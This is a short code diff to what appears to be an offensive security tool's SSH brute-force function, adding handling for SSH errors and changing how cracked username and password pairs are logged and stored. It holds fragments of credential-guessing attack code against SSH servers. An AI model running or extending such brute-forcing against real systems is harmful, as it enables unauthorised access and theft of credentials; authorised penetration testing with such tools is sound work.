@@ -4,6 +4,7 @@ from typing import List, Any
 import paramiko
 from celery import group
 from celery.result import GroupResult
+from paramiko import SSHException
 
 from redbot.core.async import celery
 from redbot.core.models import storage
@@ -84,12 +85,12 @@ def ssh_brute_force(host: str, port: int = 22, users: List[str] = [], passwords:
 
             except paramiko.AuthenticationException:
                 pass
-            except socket.error:
-                return  # TODO: handle
+            except (socket.error, SSHException):
+                return
             else:
                 cls.log("SSH successful login to {} with username: '{}', password: '{}'".format(host, user, password),
                         "success")
                 storage.sadd('notes', host)
-                storage.sadd('notes:' + host, 'Creds: {}:{}'.format(user, password))
+                storage.sadd('notes:' + host, '{}:{}'.format(user, password))
                 return
     cls.log("SSH brute force on '{}' completed, no result.".format(host), "info")
